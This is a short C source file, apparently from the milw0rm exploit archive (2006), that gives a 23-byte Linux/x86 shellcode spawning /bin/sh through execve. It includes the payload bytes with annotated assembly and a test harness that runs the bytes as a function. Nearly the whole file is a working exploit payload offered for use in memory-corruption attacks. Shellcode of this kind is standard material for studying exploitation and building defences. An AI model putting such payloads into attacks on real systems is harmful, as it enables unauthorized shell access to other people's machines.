/*
 * linux-x86-binshv2.c - 23 bytes
 * Copyright (c) 2006 Gotfault Security <xgc@gotfault.net>
 *
 * (Linux/x86) execve("/bin/sh", ["/bin/sh", NULL])
 *
 */


char shellcode[] =

  "\x6a\x0b"			// push   $0xb
  "\x58"			// pop    %eax
  "\x99"                        // cltd
  "\x52"			// push   %edx
  "\x68\x2f\x2f\x73\x68"	// push   $0x68732f2f
  "\x68\x2f\x62\x69\x6e"	// push   $0x6e69622f
  "\x89\xe3"			// mov    %esp, %ebx
  "\x52"			// push   %edx
  "\x53"			// push   %ebx
  "\x89\xe1"			// mov    %esp, %ecx
  "\xcd\x80";			// int    $0x80

int main() {

        int (*f)() = (int(*)())shellcode;
        printf("Length: %u\n", strlen(shellcode));
        f();
}

// milw0rm.com [2006-04-03]